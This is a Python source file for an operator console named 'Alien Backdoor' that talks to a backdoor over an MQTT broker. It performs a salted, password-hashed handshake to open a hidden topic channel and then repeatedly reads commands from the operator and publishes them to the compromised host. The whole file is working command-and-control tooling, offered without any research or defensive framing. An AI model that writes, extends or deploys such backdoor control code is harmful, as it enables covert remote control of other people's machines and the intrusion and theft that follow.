import argparse
import getpass
import hashlib
import json
import logging
import os
import paho.mqtt.client as mqtt
import random
import sys


def handle_salt(client, userdata, msg):
    logger = logging.getLogger("alien_backdoor")
    try:
        userid = msg.topic.split("/")[1]
    except Exception:
        logger.error("Could not get back the userID. Exiting...")
        client.disconnect()
        return
    client.unsubscribe("atman/{}".format(userid))
    salt = msg.payload.decode("utf-8")
    if salt == "NONE":
        logger.error("User {} not found with server. Exiting ...".format(userid))
        client.disconnect()
        return
    logger.debug("Received salt {} for USerID {}".format(salt, userid))
    passwd = getpass.getpass()
    if not passwd:
        logger.error("Password entered is not valid. Exiting ....")
        client.disconnect()
        return

    key =  "{}{}{}".format(salt, userid, passwd)
    new_topic = hashlib.sha256(key.encode()).hexdigest()
    token = "".join(random.choices(population=["0", "1", "2", "3", "4", "5", "6", "7", "8",
                                               "9", "a", "b", "c", "d", "e", "f"], k=20))
    logger.debug("Chosen Client Token : {}, will be listening here".format(token))

    client.message_callback_add(sub=token, callback=handle_commands)
    client.subscribe(token)
    client.publish(topic=new_topic, payload=token)


def handle_commands(client, userdata, msg):
    logger = logging.getLogger("alien_backdoor")
    cmd_rcvd = msg.payload.decode("utf-8")
    if cmd_rcvd == "OK":
        logger.info("Received successfully at Backdoor {} ...".format(userdata.get(msg.topic)))
    elif cmd_rcvd == "disconnect":
        logger.info("Disconnected from Backdoor {}. Exiting ...".format(userdata.get(msg.topic)))
        client.disconnect()
        return
    elif len(cmd_rcvd) == 20:
        # This is the server token
        userdata[msg.topic] = cmd_rcvd
        logger.debug("Communication channel setup : {} (alien) <-> {} (client)".format(cmd_rcvd, msg.topic))
    else:
        return

    command = input("\nSend command : ")
    client.publish(topic=userdata.get(msg.topic), payload=command)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Alien Backdoor')
    parser.add_argument("--verbose", "-v", action="store_true")
    args = parser.parse_args()

    logger = logging.getLogger("alien_backdoor")
    stdout_handler = logging.StreamHandler(sys.stdout)
    logger.addHandler(stdout_handler)
    if args.verbose:
        logger.setLevel(level=logging.DEBUG)
    else:
        logger.setLevel(level=logging.INFO)

    connect_info_path = os.path.join(os.path.dirname(__file__), "connect.json")

    if not os.path.exists(connect_info_path):
        sys.exit(0)
    connect_info = {}
    with open(connect_info_path, "r") as fr:
        try:
            connect_info = json.loads(fr.read())
            host, port = connect_info["host"], connect_info["port"]
        except Exception as e:
            logger.error("Connect JSON file corrupted. Exiting ....")
            sys.exit(0)
    logger.info("Connecting to MQTT host {} at port {}".format(host, port))

    client = mqtt.Client(userdata={})

    userid = input("Enter UserID : ")
    logger.info("Sending request to Check USERID with Alien ...")

    client.connect(host=host, port=port)
    topic = "atman/{}".format(userid)
    client.message_callback_add(sub=topic, callback=handle_salt)
    client.subscribe(topic)
    client.publish(topic="atman/auth", payload=userid)

    client.loop_forever()
